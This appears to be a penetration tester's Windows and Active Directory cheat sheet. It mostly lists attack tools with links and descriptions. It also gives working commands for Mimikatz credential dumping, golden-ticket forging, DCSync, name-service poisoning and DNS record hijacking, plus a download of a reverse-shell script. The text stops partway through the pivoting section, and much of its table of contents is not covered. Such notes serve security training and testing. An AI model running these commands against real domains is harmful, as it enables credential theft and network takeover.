# Windwos and Active Directory cheat sheet

# Table of content 

- [cheat sheets and resources](#cheat-sheets-and-resources)
------------------------------------------------------------------------------------
## 1. tools
- [tools](#tools)
  - [PowerView/SharpView](#PowerViewSharpView)
  - [BloodHound](#BloodHound)
  - [SharpHound](#SharpHound)
  - [BloodHound-py](#BloodHound-py)
  - [AD Kerbrute](#AD-Kerbrute)
  - [Impacket toolkit](#Impacket-toolkit)
  - [AD Responder](#AD-Responder)
  - [Inveigh-ps1](#Inveigh-ps1)
  - [C-plus Inveigh InveighZero](#C-plus-Inveigh-InveighZero)
  - [CrackMapExec CME](#CrackMapExec-CME)
  - [Rubeus](#Rubeus)
  - [GetUserSPNs-py](#GetUserSPNs-py)
  - [AD enum4linux](#AD-enum4linux)
  - [enum4linux ng](#enum4linux-ng)
  - [ldapsearch](#ldapsearch)
  - [windapsearch](#windapsearch)
  - [DomainPasswordSpray-ps1](#DomainPasswordSpray-ps1)
  - [LAPSToolkit](#LAPSToolkit)
  - [AD smbmap](#AD-smbmap)
  - [psexec-py](#psexec-py)
  - [wmiexec-py](#wmiexec-py)
  - [Snaffler](#Snaffler)
  - [smbserver-py](#smbserver-py)
  - [setspn exe](#setspn-exe)
  - [Mimikatz](#Mimikatz)
  - [kekeo](#kekeo)
  - [secretsdump-py](#secretsdump-py)
  - [AD evil winrm](#AD-evil-winrm)
  - [mssqlclient-py](#mssqlclient-py)
  - [noPac py](#noPac-py)
  - [rpcdump-py](#rpcdump-py)
  - [CVE 2021 1675-py](#CVE-2021-1675-py)
  - [ntlmrelayx-py](#ntlmrelayx-py)
  - [PetitPotam-py](#PetitPotam-py)
  - [gettgtpkinit-py](#gettgtpkinit-py)
  - [getnthash-py](#getnthash-py)
  - [adidnsdump](#adidnsdump)
  - [gpp-decrypt](#gpp-decrypt)
  - [GetNPUsers-py](#GetNPUsers-py)
  - [lookupsid-py](#lookupsid-py)
  - [ticketer-py](#ticketer-py)
  - [raiseChild-py](#raiseChild-py)
  - [Active Directory Explorer](#Active-Directory-Explorer)
  - [PingCastle](#PingCastle)
  - [Group3r](#Group3r)
  - [ADRecon](#ADRecon)
  - [tcpdump](#tcpdump)
  - [net creds](#net-creds)
  - [NetMiner](#NetMiner)
  - [Fping](#Fping)
  - [linkedin2username](#linkedin2username)
  - [SharpGPOAbuse](#SharpGPOAbuse)
  - [nsupdate](#nsupdate)
  - [openssl](#openssl)
  - [mslink](#mslink)
  - [Invoke PowerShellTcp ps1](#Invoke-PowerShellTcp-ps1)
  - [nishang](#nishang)
  - ------------------------------------------------------------------------------------
## 2. Pivoting Tunneling and Port Forwarding
- [Pivoting Tunneling and Port Forwarding](#Pivoting-Tunneling-and-Port-Forwarding)
  - [Meterpreter Tunneling and Port Forwarding](#Meterpreter-Tunneling-and-Port-Forwarding)
  - [sshuttle](#sshuttle)
  - [chisel](#chisel)
  - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling)
  - [Remote-Reverse Port Forwarding with SSH](#Remote-Reverse-Port-Forwarding-with-SSH)
  - [Socat Redirection with a Reverse Shell](#Socat-Redirection-with-a-Reverse-Shell)
  - [Socat Redirection with a Bind Shell](#Socat-Redirection-with-a-Bind-Shell)
  - [SSH for Windows plink exe](#SSH-for-Windows-plink-exe)
  - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
  - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
------------------------------------------------------------------------------------
## 3. Local Privilige Escalation
- [Local Privilige Escalation](#Local-Privilige-Escalation)
  - [Genereal Concepts](#Genereal-Concepts)
- [understanding permissions in windows](#understanding-permissions-in-windows)
  - [user accounts](#user-accounts)
  - [service accounts](#service-accounts)
  - [groups](#groups)
  - [windows resources](#windows-resources)
  - [ACLs and ACEs](#ACLs-and-ACEs)
- [spawning administrator shells](#spawning-administrator-shells)
  - [msfvenom](#msfvenom)
  - [RDP](#RDP)
- [Privilege Escalation Tools](#Privilege-Escalation-Tools)
  - [PowerUpp and SharpUp](#PowerUpp-and-SharpUp)
  - [Seatbelt](#Seatbelt)
  - [Winpeas](#Winpeas)
  - [accesschk](#accesschk)
- [Privilege Escalation Techniques](#Privilege-Escalation-Techniques)
  - [Kernel Exploits](#Kernel-Exploits)
    - [Services](#Services)
    - [Service Misconfigurations](#Service-Misconfigurations)
    - [Insecure Service Permissions](#Insecure-Service-Permissions)
    - [Unquoted Service Path](#Unquoted-Service-Path)
    - [Weak Registry Permissions](Weak-Registry-Permissions)
    - [Insecure Service Executables](#Insecure-Service-Executables)
    - [DLL Hijacking](#DLL-Hijacking)
  - [Service Exploits](#Service-Exploits)
  - [Registry exploits](#Registry-exploits)
  - [passwords](#passwords)
  - [scheduled tasks](#scheduled-tasks)
  - [insecure GUI apps](#insecure-GUI-apps)
  - [startup apps](#startup-apps)
  - [installed apps](#installed-apps)
  - [hot potato](#hot-potato)
  - [token impersonation](#token-impersonation)
  - [port forwarding](#port-forwarding)
  - [privilege escalation strategy](#privilege-escalation-strategy)
  - [getsystem Named Pipes and Token Duplication](#getsystem-Named-Pipes-and-Token-Duplication)
  - [user privileges](#user-privileges)
------------------------------------------------------------------------------------
## 4. AD focused Privilige Escalation and enumeration
- [AD focused Privilige Escalation and enumeration](#AD-focused-Privilige-Escalation-and-enumeration)
  - [resources](#resources)
  - [basic](#basic)
  - [powerview](#powerview)
  - [WES NG Windows Exploit Suggester the Next Generation](#WES-NG-Windows-Exploit-Suggester-the-Next-Generation)
  - [seatbelt](#seatbelt)
  - [winpeas](#winpeas)
  - [PrivescCheck](#PrivescCheck)
  - [metasploit exploit suggester](#metasploit-exploit-suggester)
  - [Harvesting Passwords from Usual Spots](#Harvesting-Passwords-from-Usual-Spots)
  - [Other Quick Wins](#Other-Quick-Wins)
  - [Abusing Service Misconfigurations](#Abusing-Service-Misconfigurations)
  - [Abusing dangerous privileges](#Abusing-dangerous-privileges)
  - [Abusing vulnerable software](#Abusing-vulnerable-software)
  - [Get LAPSPasswords](#Get-LAPSPasswords)
  - [powerup](#powerup)
  - [sweetpotato](#sweetpotato)
  - [JuicyPotato](#JuicyPotato)
  - [hotpotato](#hotpotato)
  - [rottenpotato](#rottenpotato)
  - [lonelypotato](#lonelypotato)
  - [roguepotato](#roguepotato)
  - [genericpotato](#genericpotato)
  - [printnightmare](#printnightmare)
------------------------------------------------------------------------------------




# Its you versus them

![image](https://user-images.githubusercontent.com/24814781/181242943-3a5e94d9-fe81-4004-8c29-facac58d4c64.png)



## cheat sheets and resources
```
https://hackersploit.org/
```
```
https://github.com/cube0x0/Security-Assessment
```
```
https://adsecurity.org/?p=1001
```
```
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
```
```
https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
```
```
https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
```
```
https://adepts.of0x.cc/shadowmove-hijack-socket/
```
```
https://pentestwiki.org/privilege-escalation-in-windows-and-linux/
```
```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
```
-------------------------------------------------------------------------------------

## tools

### PowerView/SharpView
A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

```
https://github.com/dmchell/SharpView
```
### BloodHound
Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment.
```
https://github.com/BloodHoundAD/BloodHound
```
#### resources 
```
https://www.youtube.com/watch?v=aJqjH3MsbLM
```
```
https://www.youtube.com/watch?v=gXFCiB2KI9M&t
```
```
https://www.youtube.com/watch?v=y3tB-9VBELc&t=255s
```
```
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound
```


### SharpHound

The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.

```
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
```
### BloodHound py

A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.
```
https://github.com/fox-it/BloodHound.py
```
### AD Kerbrute
A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.

```
https://github.com/ropnop/kerbrute
```

### Impacket toolkit
A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.

```
https://github.com/SecureAuthCorp/impacket
```

### Responder
Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.

```
https://github.com/lgandx/Responder
```
### Inveigh ps1
Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.
```
https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
```
```
https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters
```
example:
```
Import-Module .\Inveigh.ps1
```
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### C-plus Inveigh InveighZero
The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.

```
https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh
```
### rpcclient 
A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.

```
https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
```

### CrackMapExec CME
CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.
```
https://github.com/byt3bl33d3r/CrackMapExec
```
videos and demos:
```
https://www.youtube.com/watch?v=I2ctzF1tZX8&ab_channel=HillbillyStorytime
```
#### help section generic

options:

-h, --help            show this help message and exit

-t THREADS            set how many concurrent threads to use (default: 100)

--timeout TIMEOUT     max timeout in seconds of each thread (default: None)

--jitter INTERVAL     sets a random delay between each connection (default: None)

--darrell             give Darrell a hand

--verbose             enable verbose output

protocols:

available protocols


{smb,winrm,mssql,ldap,ssh}

smb - own stuff using SMB

winrm - own stuff using WINRM

mssql - own stuff using MSSQL

ldap - own stuff using LDAP

ssh - own stuff using SSH





### Rubeus 
Rubeus is a C# tool built for Kerberos Abuse.
```
https://github.com/GhostPack/Rubeus
```

### GetUserSPNs py
Another Impacket module geared towards finding Service Principal names tied to normal users.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
```

### AD enum4linux
A tool for enumerating information from Windows and Samba systems.
```
https://github.com/CiscoCXSecurity/enum4linux
```

### enum4linux ng
The tool enum4linux-ng is a rewrite of enum4linux in Python, but has additional features such as the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features
```
https://github.com/cddmp/enum4linux-ng
```

### ldapsearch
Built-in interface for interacting with the LDAP protocol.
```
https://linux.die.net/man/1/ldapsearch
```
#### Bypass TLS SNI check
According to this writeup:
```
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
```
just by accessing the LDAP server with an arbitrary domain name (like company.com) he was able to contact the LDAP service and extract information as an anonymous user:
```
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```


### windapsearch
A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.

```
https://github.com/ropnop/windapsearch
```

### DomainPasswordSpray ps1
DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.
```
https://github.com/dafthack/DomainPasswordSpray
```

### LAPSToolkit
LAPSToolkit 	The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).
```
https://github.com/leoloobeek/LAPSToolkit
```

### AD smbmap
SMB share enumeration across a domain.

```
https://github.com/ShawnDEvans/smbmap
```
### psexec-py
Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
```

### wmiexec-py
Part of the Impacket toolkit, it provides the capability of command execution over WMI.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
```

### Snaffler
Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.

```
https://github.com/SnaffCon/Snaffler
```

### smbserver-py
Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
```

### setspn-exe
Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.

```
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
```

### Mimikatz
Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.

```
https://github.com/ParrotSec/mimikatz
```
```
https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
```

#### example: dump hashes
```
privilege::debug
```
-- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
```
token::elevate
```
-- simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges. This is something that we have a right to do as an administrator, but that is not usually possible using normal Windows operations.

There are a variety of commands we could use here, all of which do slightly different things. The command that we will use is: lsadump::sam.
When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list.

execute: 
```
lsadump::sam
```

lsadump::sam dumps the local Security Account Manager (SAM) NT hashes (cf. SAM secrets dump). It can operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM ). It has the following command line arguments: /sam : the offline backup of the SAM hive.


#### example 2:
```
lsadump::lsa /patch
```
alternatively:
```
lsadump::lsa 
```

This is used to dump all local credentials on a Windows computer. LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).


#### golden ticket example:
first 
```
lsadump::lsa /inject /name:krbtgt
```

basic to create a Golden Ticket
```
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```
one example:
```
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-3893474861-143125734-2112006029 /krbtgt:78558f004296a6f9438f4532164a7acd /id:500
```

alternative

```
.\mimikatz.exe "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
1.) 
```
misc::cmd
```
This will open a new command prompt with elevated privileges to all machines


2.) Access other Machines! - You will now have another command prompt with access to all other machines on the network



Use the Golden Ticket to access other machine -

Mimikatz Golden Ticket Command Reference:

The Mimikatz command to create a golden ticket is “kerberos::golden”

* /domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.
* /sid – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
* /sids – Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain “S-1-5-21-1473643419-774954089-5872329127-519”. 
* /user – username to impersonate
* /groups (optional) – group RIDs the user is a member of (the first is the primary group).
Add user or computer account RIDs to receive the same access.
Default Groups: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
* /krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.
* /ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
* /ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
* /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).
* /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
* /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
* /renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
* /sids (optional) – set to be the SID of the Enterprise Admins group in the AD forest ([ADRootDomainSID]-519) to spoof Enterprise Admin rights throughout the AD forest (AD admin in every domain in the AD Forest).
* /aes128 – the AES128 key
* /aes256 – the AES256 key

Golden Ticket Default Groups:

* Domain Users SID: S-1-5-21<DOMAINID>-513
* Domain Admins SID: S-1-5-21<DOMAINID>-512
* Schema Admins SID: S-1-5-21<DOMAINID>-518
* Enterprise Admins SID: S-1-5-21<DOMAINID>-519 (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)
* Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
  
#### example 3: 
  
Mimikatz has a feature (dcsync) which utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file. This technique eliminates the need to authenticate directly with the domain controller as it can be executed from any system that is part of the domain from the context of domain administrator. Therefore it is the standard technique for red teams as it is less noisy.
```
lsadump::dcsync /domain:pentestlab.local /all /csv
```
  
By specifying the domain username with the /user parameter Mimikatz can dump all the account information of this particular user including his password hash.
```
lsadump::dcsync /domain:pentestlab.local /user:test
```
  
Alternatively executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process.
```
privilege::debug
```
```
lsadump::lsa /inject
```

### kekeo
similar to mimikatz
```
https://github.com/gentilkiwi/kekeo
```


### secretsdump-py
Remotely dump SAM and LSA secrets from a host.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
```

### evil-winrm
Provides us with an interactive shell on a host over the WinRM protocol.


```
https://github.com/Hackplayers/evil-winrm

```

### mssqlclient-py
Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
```

### noPac-py
Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.
```
https://github.com/Ridter/noPac
```

### rpcdump-py
Part of the Impacket toolset, RPC endpoint mapper.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py
```

### CVE-2021-1675-py
Printnightmare PoC in python.
```
https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
```

### ntlmrelayx-py
Part of the Impacket toolset, it performs SMB relay attacks.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
```

### PetitPotam-py
PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.
```
https://github.com/topotam/PetitPotam
```

### gettgtpkinit-py
Tool for manipulating certificates and TGTs.
```
https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
```

### getnthash-py
 	This tool will use an existing TGT to request a PAC for the current user using U2U.
```
https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
```

### adidnsdump
Active Directory Integrated DNS dumping by any authenticated user.
A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.
```
https://github.com/dirkjanm/adidnsdump
```

### gpp-decrypt
Extracts usernames and passwords from Group Policy preferences files.
```
https://github.com/t0thkr1s/gpp-decrypt
```

### GetNPUsers-py
Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
```

### lookupsid-py
SID bruteforcing tool.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py
```

### ticketer-py
A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
```

### raiseChild-py
Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py
```

### Active Directory Explorer
Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.
```
https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer
```

### PingCastle
Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security).
```
https://www.pingcastle.com/documentation/
```

### Group3r
Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).
```
https://github.com/Group3r/Group3r
```

### ADRecon
A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.
```
https://github.com/adrecon/ADRecon
```

### tcpdump 
we can use tcodump to perform the same functions as wireshark. We can also use tcpdump to save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.
```
https://linux.die.net/man/8/tcpdump
```

### net-creds
kinda like tcpdump
```
https://github.com/DanMcInerney/net-creds
```

### NetMiner
kinda like tcpdump
```
http://www.netminer.com/main/main-read.do
```

### Fping 
provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks will help us determine if anything else is active on the internal network. ICMP is not a one-stop-shop, but it is an easy way to get an initial idea of what exists. Other open ports and active protocols may point to new hosts for later targeting. 
```
https://fping.org/
```

### linkedin2username 
tool used to create a list of potentially valid users
```
https://github.com/initstring/linkedin2username
```
### SharpGPOAbuse
SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. 

a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.
```
https://github.com/FSecureLABS/SharpGPOAbuse
```

## nsupdate
nsupdate is used to submit Dynamic DNS Update requests as defined in RFC2136 to a name server. This allows resource records to be added or removed from a zone without manually editing the zone file. A single update request can contain requests to add or remove more than one resource record.

Zones that are under dynamic control via nsupdate or a DHCP server should not be edited by hand. Manual edits could conflict with dynamic updates and cause data to be lost. 

unsecured dynamic DNS updates gives any computer regardless of being joined to the domain or not, the ability to modify or create DNS records. 

As an example that we know we can update DNS records without our machine being joined to the domain we’ll use nsupdate. Let’s send a request to delete the existing A record for <ip/domain/etc> and then send an update add request for a new A record to have <service/etc> resolve to our <IP>.

```
nsupdate
```
```  
server <ip>
```
```
update delete <ip/domain/service/etc> 
```  
```  
send
```  
```
update add <same ip/domain/service/etc as you just removed> <port example 1234> A <your ip> 
```  
```  
send 
```  
```  
quit
```


  

## openssl
This package is part of the OpenSSL project’s implementation of the SSL and TLS cryptographic protocols for secure communication over the Internet.

It contains the general-purpose command line binary /usr/bin/openssl, useful for cryptographic operations such as:
creating RSA, DH, and DSA key parameters;
creating X.509 certificates, CSRs, and CRLs;
calculating message digests;
encrypting and decrypting with ciphers;
testing SSL/TLS clients and servers;
handling S/MIME signed or encrypted mail.

you can also create a public and private key with openssl using example and cert.pfx file

private key: 
```
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
```
public key:
```
openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys
```
  
then use the certs to being able to use example responder to catch a request. But Before you start responder you’ll want to copy the two certs generated earlier to "/usr/share/responder/certs" or wherever "/certs" lives on your machine so copy them over there and then change the responder config in the https part.

from:
```
[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```
to this for an example: 
```
[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/crt.pem
SSLKey = certs/key.pem
```  
  
you can also after this step, use those files to perform authentication via SSL using evil-winrm 

example: 
```
evil-winrm -S -c crt.pem -k key.pem -i 10.10.11.152
```
-c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
-k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
-S, --ssl                        Enable ssl

### mslink
This application allow you to create Windows Shortcut files (extension .LNK) without needing a Windows OS.
```
http://www.mamachine.org/mslink/index.en.html
```
### nishang
```
https://github.com/samratashok/nishang
```
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

 
### Invoke PowerShellTcp ps1
Invoke-PowerShellTcp.ps1 script coming from nishang:
```
https://github.com/samratashok/nishang
```
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

-------------------------------------------------------------------------------------


## Pivoting Tunneling and Port Forwarding
  
During a red team engagement, penetration test, or an Active Directory assessment, we will often find ourselves in a situation where we might have already compromised the required credentials, ssh keys, hashes, or access tokens to move onto another host, but there may be no other host directly reachable from our attack host. In such cases, we may need to use a pivot host that we have already compromised to find a way to our next target. One of the most important things to do when landing on a host for the first time is to check our privilege level, network connections, and potential VPN or other remote access software. If a host has more than one network adapter, we can likely use it to move to a different network segment. Pivoting is essentially the idea of moving to other networks through a compromised host to find more targets on different network segments.

There are many different terms used to describe a compromised host that we can use to pivot to a previously unreachable network segment. Some of the most common are:

    Pivot Host
    Proxy
    Foothold
    Beach Head system
    Jump Host

Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. Tunneling, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. Think of it like this:

We have a key we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.

Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.

We will inevitably come across several different terms used to describe the same thing in IT & the Infosec industry. With pivoting, we will notice that this is often referred to as Lateral Movement.

Isn't it the same thing as pivoting?

The answer to that is not exactly. Let's take a second to compare and contrast Lateral Movement with Pivoting and Tunneling, as there can be some confusion as to why some consider them different concepts.
  
### Lateral Movement, Pivoting, and Tunneling Compared
  
Lateral Movement

Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment. Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts. In addition to the explanation we have provided for this concept, we can also study how other respected organizations explain Lateral Movement. Check out these two explanations when time permits:

Palo Alto Network's Explanation

MITRE's Explanation

One practical example of Lateral Movement would be:

During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further. 

  
### Pivoting

Utilizing multiple hosts to cross network boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.

One practical example of Pivoting would be:

During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment. 


### Tunneling

We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. For example, using HTTP to mask our Command & Control traffic from a server we own to the victim host. The key here is obfuscation of our actions to avoid detection for as long as possible. We utilize protocols with enhanced security measures such as HTTPS over TLS or SSH over other transport protocols. These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.

One practical example of Tunneling would be:

One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.

To summarize, we should look at these tactics as separate things. Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments. 

## Meterpreter Tunneling and Port Forwarding

Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.

We know that the Windows target (example) is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.
example:
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

